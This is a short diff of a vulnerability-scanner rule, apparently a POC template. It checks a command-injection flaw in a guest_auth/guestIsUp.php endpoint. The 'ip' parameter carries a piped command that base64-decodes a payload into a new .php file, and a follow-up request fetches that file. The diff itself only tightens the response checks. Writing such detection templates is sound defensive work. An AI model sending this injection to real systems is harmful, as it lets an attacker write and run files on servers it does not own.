@@ -25,11 +25,11 @@ rules:
             path: /guest_auth/guestIsUp.php
             body: |
                 ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
-        expression: response.status == 200
+        expression: response.status == 200 && !response.body.bcontains(b'"success":false')
     r1:
         request:
             cache: true
             method: GET
             path: /guest_auth/{{r2}}.php
-        expression: response.status == 200 && response.body.bcontains(bytes(r1))
+        expression: response.status == 200 && response.body.bcontains(bytes(r1)) && !response.body.bcontains(b'"success":false')
 expression: r0() && r1()
